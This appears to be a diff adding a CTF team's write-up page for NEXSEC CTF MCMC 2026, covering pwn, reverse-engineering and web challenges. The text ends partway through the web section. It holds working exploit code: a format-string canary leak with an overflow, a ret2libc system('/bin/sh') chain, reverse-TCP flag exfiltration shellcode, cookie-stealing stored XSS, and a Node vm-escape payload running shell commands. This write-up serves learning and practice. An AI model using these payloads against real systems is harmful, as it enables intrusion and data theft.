@@ -36,12 +36,907 @@
     </header>
     <main id="main-content" class="writeup-page"><div class="container">
       <a class="back-link" href="../index.html#writeups">← Back to CTF write-ups</a>
-      <section class="writeup-hero"><div><p class="mono-label">NEXSEC CTF MCMC 2026</p><h1>1st preliminary · advanced to final</h1><p>Team: tuneX</p><p>Ha1qal, Kiellu4, Ni5h</p><ul class="tags"><li>Pwn</li><li>Rev</li><li>Web</li><li>Forensic</li><li>Crypto</li><li>Misc</li></ul></div><img src="../assets/writeups/nexsec-mcmc-2026-cover.svg" alt="NEXSEC CTF MCMC 2026 event cover" loading="lazy"></section>
-      <p class="redaction-note">Rules: Humanoid category - no AI; only basic DeepSeek AI (no DeepThink) allowed elsewhere.</p>
+      <section class="writeup-hero"><div><p class="mono-label">NEXSEC CTF MCMC 2026</p><h1>1st preliminary · Advanced to final round</h1><p>Team: tuneX</p><p>Ha1qal, Kiellu4, Ni5h</p><ul class="tags"><li>Pwn</li><li>Rev</li><li>Web</li><li>Forensic</li><li>Crypto</li><li>Misc</li></ul></div><img src="../assets/writeups/nexsec-mcmc-2026-cover.svg" alt="NEXSEC CTF MCMC 2026 event cover" loading="lazy"></section>
+      <p class="redaction-note">Note: Published after the competition ended.</p>
       <nav class="writeup-toc" aria-label="Write-up contents"><p class="mono-label">ON THIS PAGE</p>
-
+          <a href="#pwn">Pwn</a>
+          <a href="#rev">Rev</a>
+          <a href="#web">Web</a>
+          <a href="#forensic">Forensic</a>
+          <a href="#crypto">Crypto</a>
+          <a href="#misc">Misc</a>
       </nav>
+      <section class="writeup-category" id="pwn">
+        <h2>Pwn</h2>
+        <div class="challenge-list">
+          <details class="challenge-card">
+            <summary><span><span class="mono-label">Pwn</span><strong>gossip</strong></span><span aria-hidden="true">+</span></summary>
+            <div class="challenge-body">
+              <span class="team-credit">Solved by: Ha1qal</span>
+              <h4>Challenge</h4><p>The service provides a Windows x64 binary, gossips.exe, over a Wine-backed remote endpoint. Ghidra shows three prompts: the first two pass input directly to printf(), and the final prompt reads 512 bytes into a much smaller stack buffer.</p>
+              <h4>First look / analysis</h4><p>The format-string bug is needed to disclose the stack canary before using the final overflow. A hidden win function at binary offset 0x1000 reads flag.txt, so the exploit must calculate its relocated address from a leaked return address.</p>
+              <ol>
+              <li class="solve-step"><h4>Inspect the binary and identify both primitives</h4>
+                <p>I opened gossips.exe in Ghidra and followed the three input prompts. The first two calls use attacker-controlled input as a printf() format string, while the “last words” prompt calls ReadFile() with 512 bytes against a smaller stack buffer.</p>
+                <p>The source also identifies a hidden win function at offset 0x1000. It reads flag.txt and prints the flag, so the objective is to preserve the canary and redirect the saved return path to win.</p>
 
+
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/gossip-1.webp" alt="gossip challenge page showing the supplied Windows x64 binary and service" loading="lazy"><figcaption>The starting challenge page: gossips.exe is served through the stated remote service.</figcaption></figure>
+
+              </li>
+              <li class="solve-step"><h4>Leak the canary and the return address</h4>
+                <p>I used the second prompt, “tell me a secret”, because it accepts a long format-string payload. Sending %p. sixty times exposes stack values without triggering the later overflow.</p>
+                <p>The recorded output places the stack canary at index 43 and the return address at index 46. I calculate the binary base as ret_leak - 0x15f0, then derive WIN as base + 0x1000 and the alignment RET gadget as base + 0x10e7.</p>
+                <div class="table-wrap"><table><thead><tr><th>Value</th><th>Meaning</th></tr></thead><tbody><tr><td>43</td><td>Format-string index of the stack canary</td></tr><tr><td>46</td><td>Format-string index of the return address</td></tr><tr><td>0x15f0</td><td>Return-address offset used to recover the base</td></tr><tr><td>0x1000</td><td>win function offset</td></tr><tr><td>0x10e7</td><td>ret alignment-gadget offset</td></tr></tbody></table></div>
+                <p class="code-language">python</p>
+                <pre><code>p.sendline(b&quot;%p.&quot; * 60)
+canary = vals[43]
+ret_leak = vals[46]
+base = ret_leak - 0x15f0
+WIN = base + 0x1000
+RET_GADGET = base + 0x10e7</code></pre>
+
+
+              </li>
+              <li class="solve-step"><h4>Build the canary-safe overflow</h4>
+                <p>Disassembly places the canary 272 bytes from the overflow start and the return address at offset 296. I keep the leaked canary intact, add the two recorded eight-byte fields, then place a ret gadget before win.</p>
+                <p>Jumping directly to win initially crashed because the stack was not aligned. The extra ret gadget fixes that alignment before win executes.</p>
+
+                <p class="code-language">python</p>
+                <pre><code>payload = b&quot;A&quot; * 272
+payload += p64(canary)
+payload += b&quot;B&quot; * 8
+payload += b&quot;C&quot; * 8
+payload += p64(RET_GADGET)
+payload += p64(WIN)
+p.send(payload)</code></pre>
+
+                <a class="file-download" href="../assets/writeups/nexsec/files/gossip-exploit.py" download>Download full exploit (gossip-exploit.py)<span>1.1 KB</span></a>
+              </li>
+              <li class="solve-step"><h4>Run the exploit and verify code execution</h4>
+                <p>The final solver leaked the canary and relocated addresses, bypassed the stack-protector check, and redirected execution to the hidden win function. The output below records the successful connection, calculated values, and returned flag.</p>
+
+
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/gossip-2.webp" alt="Successful gossip exploit output showing leaked addresses and flag capture" loading="lazy"><figcaption>Final exploit output: the canary and base are leaked, WIN is calculated, and the service prints the flag.</figcaption></figure>
+
+              </li>
+              </ol>
+              <h4>Result</h4><p>The exploit bypassed the canary check and reached the hidden win function, which printed the flag.</p>
+            <p class="flag-label">Flag</p>
+            <pre><code>nexsec26{7b36d77599975e07aa26f532e2054974b3dcf4ca8333fec326369dd455c2a872}</code></pre>
+
+              <p><strong>Tools used:</strong> Ghidra, Pwntools, Python, format-string analysis. <strong>What I learned:</strong> A format-string leak can turn a protected stack overflow into a reliable exploit. Correct stack alignment is essential when chaining into a target function on x64.</p>
+            </div>
+          </details>
+          <details class="challenge-card">
+            <summary><span><span class="mono-label">Pwn</span><strong>SpeedRun</strong></span><span aria-hidden="true">+</span></summary>
+            <div class="challenge-body">
+              <span class="team-credit">Solved by: Ha1qal</span>
+              <h4>Challenge</h4><p>A statically linked, non-PIE ELF binary with a stack canary, two validation gates, a shellcode filter, an RWX mapping, seccomp, and closed standard streams.</p>
+              <h4>First look / analysis</h4><p>The source combines numeric-gate bypasses, runtime construction of syscall bytes, and a reverse TCP exfiltration path because ordinary stdout cannot return the flag.</p>
+              <ol>
+              <li class="solve-step"><h4>Inspect the supplied files and protections</h4>
+                <p>I used file, checksec, Ghidra, and GDB. The binary has a canary, no PIE, NX, a later RWX mapping, seccomp restrictions, and a static filter for bytes 0F 05.</p>
+
+
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/speedrun-1.webp" alt="SpeedRun challenge page with the supplied Docker and challenge files" loading="lazy"><figcaption>The SpeedRun start page provides the challenge artifacts and remote service.</figcaption></figure>
+
+              </li>
+              <li class="solve-step"><h4>Bypass the two validation gates</h4>
+                <p>For the first comparison gate, I submitted nan: ordered comparisons with NaN are false. For the second scanf(&quot;%f&quot;) gate, 0x1.337p-137 has IEEE-754 bits 0x00001337, satisfying the integer comparison.</p>
+
+                <p class="code-language">text</p>
+                <pre><code>nan
+0x1.337p-137</code></pre>
+
+
+              </li>
+              <li class="solve-step"><h4>Build the filtered shellcode path</h4>
+                <p>The payload cannot contain literal 0F 05. The solver writes 0F, 05, and C3 into writable executable memory to form syscall; ret at runtime, then uses socket, connect, openat, getdents64, read, and write.</p>
+                <p>It connects to the listener, enumerates /home/mirai for the randomized flag- filename, reads that file, and transmits its content back through the TCP socket.</p>
+
+
+
+                <a class="file-download" href="../assets/writeups/nexsec/files/speedrun-exploit.py" download>Download exploit scaffold (speedrun-exploit.py)<span></span></a>
+              </li>
+              <li class="solve-step"><h4>Configure the callback and run the exploit</h4>
+                <p>The source configures a Portmap.io TCP mapping to the local listener before sending the Pwntools payload. The screenshot records the mapping stage used by the final exploit.</p>
+
+
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/speedrun-2.webp" alt="Portmap TCP mapping used for the SpeedRun exploit callback" loading="lazy"><figcaption>The callback mapping required for the SpeedRun exploit output path.</figcaption></figure>
+
+              </li>
+              </ol>
+              <h4>Result</h4><p>The shellcode used the reverse TCP channel to return the flag after bypassing both gates and the static syscall filter.</p>
+            <p class="flag-label">Flag</p>
+            <pre><code>nexsec26{Good___morning___or___perhaps___good___evening___everyone!!!}</code></pre>
+
+              <p><strong>Tools used:</strong> file, checksec, Ghidra, GDB, Pwntools, Portmap.io. <strong>What I learned:</strong> NaN and hexadecimal floating-point values can defeat poorly designed numeric checks. When output is closed, a permitted network syscall can provide the exfiltration channel.</p>
+            </div>
+          </details>
+          <details class="challenge-card">
+            <summary><span><span class="mono-label">Pwn</span><strong>Playlist</strong></span><span aria-hidden="true">+</span></summary>
+            <div class="challenge-body">
+              <span class="team-credit">Solved by: Ha1qal</span>
+              <h4>Challenge</h4><p>A Linux binary called playlist reads track IDs. Its size check uses 32-bit multiplication while read() receives a 64-bit multiplication result, producing a stack overflow through an integer wraparound.</p>
+              <h4>First look / analysis</h4><p>The source records NX, so the intended route is a two-stage return-to-libc chain: leak puts through the GOT, then call system(&quot;/bin/sh&quot;) with the recovered libc base.</p>
+              <ol>
+              <li class="solve-step"><h4>Inspect the challenge and the integer-width mismatch</h4>
+                <p>The program checks if 4 * count is at most 56 but passes 4LL * count to read(). Supplying 1073741824 (2^30) wraps the 32-bit check to zero while the 64-bit length remains huge.</p>
+                <p>That bypass makes the stack buffer reachable without guessing a size accepted by the guard.</p>
+
+                <p class="code-language">text</p>
+                <pre><code>1073741824  # 2^30</code></pre>
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/playlist-1.webp" alt="Playlist challenge page showing the supplied binary" loading="lazy"><figcaption>The Playlist challenge start page and supplied binary.</figcaption></figure>
+
+              </li>
+              <li class="solve-step"><h4>Leak puts and recover libc</h4>
+                <p>The first ROP chain uses 64 bytes of buffer padding, eight bytes of saved-frame padding, then pop rdi; puts@GOT; puts@PLT; main. Returning to main provides a second input after the real puts address is printed.</p>
+                <p>I calculate libc.address as leak - libc.sym[&quot;puts&quot;], then find /bin/sh with libc.search().</p>
+
+                <p class="code-language">python</p>
+                <pre><code>payload1 = b&quot;A&quot; * 64 + b&quot;B&quot; * 8
+payload1 += p64(POP_RDI) + p64(elf.got[&quot;puts&quot;])
+payload1 += p64(elf.plt[&quot;puts&quot;]) + p64(MAIN)
+libc.address = leak - libc.sym[&quot;puts&quot;]</code></pre>
+
+
+              </li>
+              <li class="solve-step"><h4>Send the aligned system chain</h4>
+                <p>The second chain again reaches the vulnerable read path. A ret gadget precedes pop rdi; /bin/sh; system so the stack remains correctly aligned before libc system() runs.</p>
+
+                <p class="code-language">python</p>
+                <pre><code>payload2 = b&quot;A&quot; * 64 + b&quot;B&quot; * 8
+payload2 += p64(RET)
+payload2 += p64(POP_RDI) + p64(binsh)
+payload2 += p64(libc.sym[&quot;system&quot;])</code></pre>
+
+                <a class="file-download" href="../assets/writeups/nexsec/files/playlist-exploit.py" download>Download full exploit (playlist-exploit.py)<span>1.1 KB</span></a>
+              </li>
+              <li class="solve-step"><h4>Read flag.txt from the shell</h4>
+                <p>The returned interactive shell confirms the puts leak, libc base, /bin/sh address, and system address. Listing the directory and reading flag.txt produces the final flag.</p>
+
+
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/playlist-2.webp" alt="Playlist exploit output showing libc addresses, interactive shell, and flag.txt" loading="lazy"><figcaption>Final Playlist exploit output: the return-to-libc chain opens a shell and reads flag.txt.</figcaption></figure>
+
+              </li>
+              </ol>
+              <h4>Result</h4><p>The two-stage ROP chain turned the integer overflow into an interactive shell and returned the flag.</p>
+            <p class="flag-label">Flag</p>
+            <pre><code>nexsec26{integer_overflow_to_ret_2_l1b_goes_brrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr_3eab3fd91628053ce62e2d4e44071860670a6a470397f47bf253c6c3f2423825}</code></pre>
+
+              <p><strong>Tools used:</strong> Ghidra, Pwntools, ROP, libc analysis. <strong>What I learned:</strong> An overflow can arise when a validation calculation uses a narrower integer width than the later read. Under NX, a controlled libc leak enables a reliable system chain.</p>
+            </div>
+          </details>
+        </div>
+      </section>
+      <section class="writeup-category" id="rev">
+        <h2>Rev</h2>
+        <div class="challenge-list">
+          <details class="challenge-card">
+            <summary><span><span class="mono-label">Rev</span><strong>Bytecode Bakery</strong></span><span aria-hidden="true">+</span></summary>
+            <div class="challenge-body">
+              <span class="team-credit">Solved by: Kiellu4</span>
+              <h4>Challenge</h4><p>Files: oven.py, recipe.bin. DeepSeek reference: https://chat.deepseek.com/share/liwfpdf8s7hc5b1fo5</p>
+              <h4>First look / analysis</h4><p>SHA256 oven.py: 161e6c15bf0305132257d5d9f6f1732dca1976afa383d2023df5573266744782. SHA256 recipe.bin: ee84b6f469eb82dac886786e28e65e8ea1a3a3436d2778a0e1a54b4b467db4a0.</p>
+              <ol>
+              <li class="solve-step"><h4>Opening and file metadata</h4>
+                <p>The supplied interpreter runs a custom stack machine over recipe.bin. The challenge validates a 50-byte ingredient list.</p>
+
+
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/bytecode-bakery-1.webp" alt="Bytecode Bakery challenge page" loading="lazy"><figcaption>Opening Bytecode Bakery challenge page.</figcaption></figure>
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/bytecode-bakery-2.webp" alt="SHA256 values for oven.py and recipe.bin" loading="lazy"><figcaption>Source hash verification for both supplied files.</figcaption></figure>
+
+              </li>
+              <li class="solve-step"><h4>Map the BAKE format and opcodes</h4>
+                <p>recipe.bin begins with BAKE, followed by version, input length, little-endian code length, and bytecode. SUB computes value below minus pushed operand; ROL rotates the value below by the pushed count.</p>
+                <div class="table-wrap"><table><thead><tr><th>Offset</th><th>Size</th><th>Field</th></tr></thead><tbody><tr><td>0</td><td>4</td><td>BAKE magic</td></tr><tr><td>4</td><td>1</td><td>Version</td></tr><tr><td>5</td><td>2</td><td>Input length</td></tr><tr><td>6</td><td>2</td><td>Little-endian code length</td></tr><tr><td>8</td><td>N</td><td>Bytecode</td></tr></tbody></table></div>
+                <div class="table-wrap"><table><thead><tr><th>Opcode</th><th>Mnemonic</th></tr></thead><tbody><tr><td>01</td><td>PUSH b</td></tr><tr><td>02</td><td>LOAD i</td></tr><tr><td>03</td><td>ADD</td></tr><tr><td>04</td><td>SUB</td></tr><tr><td>05</td><td>XOR</td></tr><tr><td>06</td><td>ROL</td></tr><tr><td>07</td><td>EQ</td></tr><tr><td>08</td><td>JNZ</td></tr><tr><td>09</td><td>JMP</td></tr><tr><td>0A</td><td>FAIL</td></tr><tr><td>0B</td><td>OK</td></tr><tr><td>0C</td><td>DUP</td></tr><tr><td>0D</td><td>AND</td></tr></tbody></table></div>
+
+
+                <a class="file-download" href="../assets/writeups/nexsec/files/bytecode-bakery-disassemble.py" download>Download disassembler (bytecode-bakery-disassemble.py)<span></span></a>
+              </li>
+              <li class="solve-step"><h4>Disassemble and invert both stages</h4>
+                <p>The disassembly gives version 1, input length 50, and code length 1143. Stage A checks positions 0–24 with ing[i] = K XOR C and yields a decoy. Stage B chains all 50 bytes: undo arithmetic, rotate right, then undo the XOR with the preceding byte. Index zero also requires K2 = 0x8b.</p>
+
+
+
+                <a class="file-download" href="../assets/writeups/nexsec/files/bytecode-bakery-solver.py" download>Download full solver (bytecode-bakery-solver.py)<span></span></a>
+              </li>
+              <li class="solve-step"><h4>Output and verify</h4>
+                <p>The solver outputs the recovered 50-byte ingredient list. Feeding it to oven.py verifies the list and accepts the flag format.</p>
+
+
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/bytecode-bakery-3.webp" alt="Bytecode Bakery solver output" loading="lazy"><figcaption>The source solver output.</figcaption></figure>
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/bytecode-bakery-4.webp" alt="Bytecode Bakery oven verification" loading="lazy"><figcaption>oven.py accepts the recovered ingredient list.</figcaption></figure>
+
+              </li>
+              </ol>
+              <h4>Result</h4><p>The reconstructed ingredient list passes the custom bytecode validator.</p>
+            <p class="flag-label">Flag</p>
+            <pre><code>nexsec26{th15_byt3_i5_b4k3d_n0t_fry3d_xD_ZXJ6eQ==}</code></pre>
+
+              <p><strong>Tools used:</strong> Python, custom bytecode analysis. <strong>What I learned:</strong> Operand order and the asymmetric first Stage B block are essential to the inverse transformation.</p>
+            </div>
+          </details>
+          <details class="challenge-card">
+            <summary><span><span class="mono-label">Rev</span><strong>Flag Checker</strong></span><span aria-hidden="true">+</span></summary>
+            <div class="challenge-body">
+              <span class="team-credit">Solved by: Ha1qal</span>
+              <h4>Challenge</h4><p>A PlayStation 5 binary that asks for a password through a controller-driven 41-character keypad. The source starts by installing GhidraOrbis for this binary format.</p>
+              <h4>First look / analysis</h4><p>The target checker is FUN_010000f0: it accepts exactly 40 bytes and applies 60+ byte-level arithmetic constraints over a decrypted 41-character alphabet.</p>
+              <ol>
+              <li class="solve-step"><h4>Open the PS binary and map file addresses</h4>
+                <p>GhidraOrbis is required before analysing the PS binary. readelf -l gives three LOAD segments with file_offset = ghidra_vaddr − 0x01000000 + 0x4000.</p>
+                <p>readelf -d shows the VideoOut, Pad, UserService, UniversalDataSystem, and Trophy imports. Searching for imul eax, eax, 0x1fb9 finds eleven LCG decryptors.</p>
+
+
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/flag-checker-1.webp" alt="Flag Checker challenge page" loading="lazy"><figcaption>The Flag Checker opening challenge screenshot.</figcaption></figure>
+
+              </li>
+              <li class="solve-step"><h4>Decrypt the embedded tables</h4>
+                <p>Every decryptor uses u = (u * 0x1fb9 + 0x6efb) % 0x20d38 and XORs the low byte into its source table. Python must emulate uint32_t overflow before the modulus.</p>
+                <p>One output is the input alphabet: abcdefghijklmnopqrstuvwxyz0123456789{}!?_.</p>
+
+                <p class="code-language">python</p>
+                <pre><code>u = (u * 0x1fb9) &amp; 0xffffffff
+u = (u + 0x6efb) &amp; 0xffffffff
+u = u % 0x20d38</code></pre>
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/flag-checker-2.webp" alt="Decrypted Flag Checker table output" loading="lazy"><figcaption>The decrypted table list reveals the 41-character keypad alphabet.</figcaption></figure>
+
+              </li>
+              <li class="solve-step"><h4>Model the keypad checker in Z3</h4>
+                <p>FUN_010009d0 appends selected keypad characters and calls FUN_010000f0 when Square is pressed. The checker requires 0x28 bytes.</p>
+                <p>I modelled each byte as BitVec(8), zero-extended it for the decompiler’s unsigned arithmetic, and constrained every character to the recovered alphabet. The source records that R13D reloads caused several UNSAT transcription bugs; after offset 0x037e it represents c[3].</p>
+                <div class="table-wrap"><table><thead><tr><th>Property</th><th>Source value</th></tr></thead><tbody><tr><td>Required input length</td><td>0x28 / 40 bytes</td></tr><tr><td>Alphabet length</td><td>41</td></tr><tr><td>LCG multiplier</td><td>0x1fb9</td></tr><tr><td>LCG increment</td><td>0x6efb</td></tr><tr><td>LCG modulus</td><td>0x20d38</td></tr></tbody></table></div>
+
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/flag-checker-3.webp" alt="Flag Checker Z3 transcription bug table" loading="lazy"><figcaption>The source records the R13D/c[3] corrections that made the constraint set satisfiable.</figcaption></figure>
+
+              </li>
+              <li class="solve-step"><h4>Solve and verify</h4>
+                <p>The source Z3 model reports 105 constraints, returns sat, and prints the recovered flag.</p>
+
+
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/flag-checker-4.webp" alt="Flag Checker Z3 output showing 105 constraints, sat result, and recovered flag" loading="lazy"><figcaption>The PDF result page shows “constraints: 105”, a sat result, and the recovered flag.</figcaption></figure>
+                <a class="file-download" href="../assets/writeups/nexsec/files/flag-checker-z3-source.txt" download>Download full Z3 source transcript (flag-checker-z3-source.txt)<span></span></a>
+              </li>
+              </ol>
+              <h4>Result</h4><p>The recovered 40-byte keypad input satisfies the checker and unlocks the flag.</p>
+            <p class="flag-label">Flag</p>
+            <pre><code>nexsec26{c4n_w3_pl4y_gta6_0n_w1nd0w5???}</code></pre>
+
+              <p><strong>Tools used:</strong> GhidraOrbis, readelf, Ghidra, Z3, Python. <strong>What I learned:</strong> Decompiler-derived constraints need exact unsigned-width modelling. Adding constraints incrementally isolates a single bad transcription far faster than debugging a full UNSAT model.</p>
+            </div>
+          </details>
+          <details class="challenge-card">
+            <summary><span><span class="mono-label">Rev</span><strong>матрёшка</strong></span><span aria-hidden="true">+</span></summary>
+            <div class="challenge-body">
+              <span class="team-credit">Solved by: Ha1qal</span>
+              <h4>Challenge</h4><p>matryoshka.exe is a .NET Framework 4.7.2 binary protected by Obfuscar and a custom high-entropy packer. The source ultimately finds thirty AES-encrypted .NET assemblies arranged as five recursive levels.</p>
+              <h4>First look / analysis</h4><p>Each doll validates part of a 16-character password with HMAC-SHA256. The recovered password is rhkaDwfinMePcolz; its SHA-256 matches the embedded verifier.</p>
+              <ol>
+              <li class="solve-step"><h4>Initial Analysis</h4>
+                <p>I identify a .NET Framework 4.7.2 executable with Obfuscar string encryption and a custom packer. The analysis goal is to unpack the embedded “dolls” and follow their recursive verification.</p>
+
+
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/matryoshka-1.webp" alt="матрёшка challenge screenshot" loading="lazy"><figcaption>The матрёшка opening challenge evidence.</figcaption></figure>
+
+              </li>
+              <li class="solve-step"><h4>Unpacking with de4dot-cex</h4>
+                <p>I run de4dot-cex against matryoshka.exe. It renames symbols but does not remove the custom packer, so the remaining work is static extraction and AES decryption of embedded dolls.</p>
+
+                <p class="code-language">bash</p>
+                <pre><code>TERM=dumb mono ./de4dot-x64.exe matryoshka.exe -o matryoshka_cex.exe</code></pre>
+
+
+              </li>
+              <li class="solve-step"><h4>Decoding the 13 Obfuscated Strings</h4>
+                <p>dnSpy reveals a decryptor that applies byte_0[i] = byte_0[i] ^ i ^ 170. Decoding these strings exposes the data used by the packed hierarchy.</p>
+
+
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/matryoshka-2.webp" alt="Decoding strings source screenshot" loading="lazy"><figcaption>Decoding strings: the source image for the Obfuscar string-decryption stage.</figcaption></figure>
+
+              </li>
+              <li class="solve-step"><h4>Extracting Resources and Deriving the Root Key</h4>
+                <p>dnfile extracts doll-0 and doll-1 resources. The AES base key is the XOR of the three hex-decoded strings; child keys are derived from their parent key and ASCII child path.</p>
+
+
+
+
+              </li>
+              <li class="solve-step"><h4>The Doll Class — Recursive Verification</h4>
+                <p>Each doll decrypts a child AES-256-CBC blob using its derived key, then invokes it through reflection. Leaf dolls use HMAC-SHA256 to pin an individual password character.</p>
+
+
+
+
+              </li>
+              <li class="solve-step"><h4>Tree Structure (30 Dolls, 5 Levels)</h4>
+                <p>The two roots partition the sixteen password positions through a binary tree. Recursing through the thirty dolls reaches every leaf and fixes every character.</p>
+
+
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/matryoshka-3.webp" alt="матрёшка recursive tree structure" loading="lazy"><figcaption>The source tree structure for the 30 dolls across five levels.</figcaption></figure>
+
+              </li>
+              <li class="solve-step"><h4>The Complete Solver Script</h4>
+                <p>The source solver walks both roots, decrypts each doll, tests the leaf HMAC values, and verifies the complete password against the embedded SHA-256 verifier.</p>
+
+
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/matryoshka-4.webp" alt="матрёшка solver output showing nested flag" loading="lazy"><figcaption>Solver output: recursive walk, recovered password verification, and the nested final flag.</figcaption></figure>
+                <a class="file-download" href="../assets/writeups/nexsec/files/matryoshka-solver-source.txt" download>Download full source solver transcript (matryoshka-solver-source.txt)<span></span></a>
+              </li>
+              </ol>
+              <h4>Result</h4><p>The recursive solver recovers rhkaDwfinMePcolz, matches the embedded SHA-256 verifier, and unlocks the flag.</p>
+            <p class="flag-label">Flag</p>
+            <pre><code>nexsec26{nexsec26{nexsec26{ }}}🚩</code></pre>
+
+              <p><strong>Tools used:</strong> dnSpy, de4dot-cex, dnfile, Python, AES, HMAC-SHA256. <strong>What I learned:</strong> Static resource extraction can defeat a custom managed-code packer when each child’s key derivation and verification data are recoverable.</p>
+            </div>
+          </details>
+        </div>
+      </section>
+      <section class="writeup-category" id="web">
+        <h2>Web</h2>
+        <div class="challenge-list">
+          <details class="challenge-card">
+            <summary><span><span class="mono-label">Web</span><strong>Ado</strong></span><span aria-hidden="true">+</span></summary>
+            <div class="challenge-body">
+              <span class="team-credit">Solved by: Ha1qal</span>
+              <h4>Challenge</h4><p>An Adonis application source bundle exposes an IDOR, a stored-XSS sink, upload filename traversal, and vm.runInContext report generation.</p>
+              <h4>First look / analysis</h4><p>The source chains these flaws: use an IDOR for a user session, let the admin bot execute stored XSS, overwrite the report template, then escape the VM context.</p>
+              <ol>
+              <li class="solve-step"><h4>Map routes and trust boundaries</h4>
+                <p>The source bundle exposes AccountsController, CommentsController, AdminUploadController, session configuration, routes, and an admin Puppeteer bot. The admin comments template renders raw triple-brace comment bodies, while session cookies are readable by JavaScript.</p>
+
+
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/ado-1.webp" alt="Ado source challenge screenshot" loading="lazy"><figcaption>Ado source evidence at the start of the investigation.</figcaption></figure>
+
+              </li>
+              <li class="solve-step"><h4>Leak a user account through the IDOR</h4>
+                <p>I request internal account 3 to retrieve Hana’s credentials. Hana is not an administrator, but her account is enough to post comments.</p>
+
+                <p class="code-language">bash</p>
+                <pre><code>curl -s http://koala.nexsec.my:38903/api/v1/internal/accounts/3</code></pre>
+
+
+              </li>
+              <li class="solve-step"><h4>Use stored XSS against the admin bot</h4>
+                <p>I log in as Hana, post the documented image-onerror payload, and wait for the bot’s /admin/comments visit. It reads document.cookie because httpOnly is false and posts the encoded admin cookie back as a comment.</p>
+
+                <p class="code-language">bash</p>
+                <pre><code>sleep 90
+curl -s http://koala.nexsec.my:38903/posts/1/comments | grep -o &quot;XXX_[^_]*_XXX&quot; | grep -v btoa | tail -1</code></pre>
+
+
+              </li>
+              <li class="solve-step"><h4>Traverse into the report template</h4>
+                <p>The upload uses file.move() with the supplied filename. One ../ from /app/storage/uploads correctly reaches /app/storage/reports/template.js. I upload the documented template module under that filename.</p>
+
+                <p class="code-language">javascript</p>
+                <pre><code>module.exports={generate(){return module.constructor.constructor(&#x27;return process&#x27;)().mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /app/flag.txt&#x27;).toString()}}</code></pre>
+
+
+              </li>
+              <li class="solve-step"><h4>Trigger the VM escape</h4>
+                <p>generateReport runs the uploaded template in vm.runInContext. The host-realm module object leaks its constructor chain, so the template reaches process, child_process, and cat /app/flag.txt.</p>
+
+                <p class="code-language">bash</p>
+                <pre><code>curl -s -H &quot;Cookie: $NEW&quot; http://koala.nexsec.my:38903/admin/generate-report</code></pre>
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/ado-2.webp" alt="Ado generate-report response containing the flag" loading="lazy"><figcaption>The generate-report response returns the Ado flag after the VM escape.</figcaption></figure>
+
+              </li>
+              </ol>
+              <h4>Result</h4><p>The chained IDOR, XSS, path traversal, and VM escape reads /app/flag.txt.</p>
+            <p class="flag-label">Flag</p>
+            <pre><code>nexsec26{Did_you_enjoy_DnD_song?kinda_g00d_actually_oh_btw_this_is_4don1s_cve_6497b2f58bd4fd80922b8991b40e5935e7635a6be0f86050fd955fa75f68fae5}</code></pre>
+
+              <p><strong>Tools used:</strong> curl, Adonis source review, Puppeteer-bot analysis, JavaScript. <strong>What I learned:</strong> A host-realm object passed into vm.createContext can invalidate the intended sandbox. Chained web flaws often need a low-privilege session before the privileged sink is reachable.</p>
+            </div>
+          </details>
+          <details class="challenge-card">
+            <summary><span><span class="mono-label">Web</span><strong>3NC0R3</strong></span><span aria-hidden="true">+</span></summary>
+            <div class="challenge-body">
+              <span class="team-credit">Solved by: Ha1qal</span>
+              <h4>Challenge</h4><p>A wall application uses MD5(card_id) permalinks and an LFI-style scan loader. The challenge is to recover Carl’s passphrase by following unlisted drafts and the longhand note.</p>
+              <h4>First look / analysis</h4><p>The changelog says the permalink is a hash of the card number, exposing an IDOR. The loader then has a one-decode filter and naive ../ replacement.</p>
+              <ol>
+              <li class="solve-step"><h4>Recon the wall and permalink format</h4>
+                <p>I enumerate /m/&lt;32-hex&gt; links from /wall and read /changelog. It states that permalinks are MD5 hashes of card IDs rather than random tokens.</p>
+
+                <p class="code-language">bash</p>
+                <pre><code>curl -s &quot;$BASE/wall&quot; | grep -oE &quot;/m/[a-f0-9]{32}&quot; | sort -u
+curl -s &quot;$BASE/changelog&quot; | sed -n &quot;/&lt;main&gt;/,/&lt;\/main&gt;/p&quot; | sed &quot;s/&lt;[^&gt;]*&gt;//g&quot;</code></pre>
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/3nc0r3-1.webp" alt="3NC0R3 source screenshot" loading="lazy"><figcaption>The PDF screenshot for the 3NC0R3 source section.</figcaption></figure>
+
+              </li>
+              <li class="solve-step"><h4>Enumerate unlisted draft cards</h4>
+                <p>I hash sequential card IDs and request each permalink. Cards 3, 6, 13, 20, 25 are not on the wall and reveal the useful hints.</p>
+
+                <p class="code-language">bash</p>
+                <pre><code>for n in $(seq 1 60); do h=$(printf &quot;%s&quot; &quot;$n&quot; | md5sum | cut -d&quot; &quot; -f1); curl -s -o /dev/null -w &quot;%{http_code}&quot; &quot;$BASE/m/$h&quot;; done</code></pre>
+
+
+              </li>
+              <li class="solve-step"><h4>Read full untruncated stories</h4>
+                <p>The page truncates stories at 120 characters, but ?full=1 returns the complete draft. The useful notes identify sweet_memory.txt and the vulnerable /scan?file= loader.</p>
+
+                <p class="code-language">bash</p>
+                <pre><code>H=$(printf &quot;3&quot; | md5sum | cut -d&quot; &quot; -f1)
+curl -s &quot;$BASE/m/$H?full=1&quot;</code></pre>
+
+
+              </li>
+              <li class="solve-step"><h4>Confirm and bypass the file loader</h4>
